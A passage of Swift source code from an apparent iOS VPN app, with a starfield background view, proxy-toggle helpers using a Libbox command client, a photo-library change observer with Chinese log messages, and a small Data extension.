//                .frame(width: 100 ,height: 100 )
//        })
        
        ZStack{
             BackgroundBg()
            
            
            // Little Planet and little stars....
            Image("mars")
                .resizable()
                .aspectRatio(contentMode: .fill)
                .frame(width: 30, height: 30)
                .scaleEffect(getRect().height < 750 ? 0.8 : 1)
            // not using offset...
            // using postiton..
            // this will position the object using screen basis...
                .position(x: 50, y: getRect().height < 750 ? 200 : 220)
                .opacity(0.7)
            
            // Sample star points....
            let stars: [CGPoint] = [
            
                CGPoint(x: 15, y: 190),
                CGPoint(x: 25, y: 250),
                CGPoint(x: 20, y: 350),
                CGPoint(x: getRect().width - 30, y: 240),
            ]
            
            ForEach(stars,id: \.x){star in
                
                Circle()
                    .fill(.white.opacity(0.3))
                    .frame(width: 5, height: 5)
                    .position(star)
                    .offset(y: getRect().height < 750 ? -20 : 0)
            }
                        
             
       
        }
        .ignoresSafeArea()
    }
    
    
    private nonisolated func serviceReload() async throws {
        try LibboxNewStandaloneCommandClient()!.serviceReload()
    }

    private nonisolated func setSystemProxyEnabled(_ isEnabled: Bool) async {
        do {
            try LibboxNewStandaloneCommandClient()!.setSystemProxyEnabled(isEnabled)
            await SharedPreferences.systemProxyEnabled.set(isEnabled)
        } catch {
            await MainActor.run {
                alert = Alert(error)
            }
        }
    }
    
    
    func getTitle()->AttributedString{
        var str = AttributedString("sss")
        
        if let range = str.range(of: "Lite"){
            str[range].font = .system(size: 24, weight: .light)
        }
        
        if let range = str.range(of: "VPN"){
            str[range].font = .system(size: 24, weight: .black)
        }
        
        return str
    }
     
}

// MARK: - PhotoLibraryObserver Class
public class PhotoLibraryObserver: NSObject, ObservableObject, PHPhotoLibraryChangeObserver {
    
    // 回调闭包，用于调用 HomeView 中的方法
    var onPhotoLibraryChanged: (() -> Void)?
    
    public override init() {
        super.init()
        print("📸 PhotoLibraryObserver 初始化完成")
    }
    
    public func photoLibraryDidChange(_ changeInstance: PHChange) {
        print("📸 Photo library did change - 相册发生变化")
        
        DispatchQueue.main.async {
            // 在主线程更新UI，调用 HomeView 中的处理方法
            print("📸 Processing photo library changes on main thread")
            self.onPhotoLibraryChanged?()
        }
    }
    
    
    func register() {
        PHPhotoLibrary.shared().register(self)
        print("📸 已注册相册变化监听")
    }
    
    func unregister() {
        PHPhotoLibrary.shared().unregisterChangeObserver(self)
        print("📸 已取消注册相册变化监听")
    }
}

//struct HomeView_Previews: PreviewProvider {
//
//    static var previews: some View {
//        HomeView()
//    }
//}/ Triangle shape for the small tail in the speech bubble

// Data扩展：用于简化追加数据到Data对象
extension Data {
    mutating func appendString(_ string: String) {
        if let data = string.data(using: .utf8) {
            append(data)
        }
    }
}

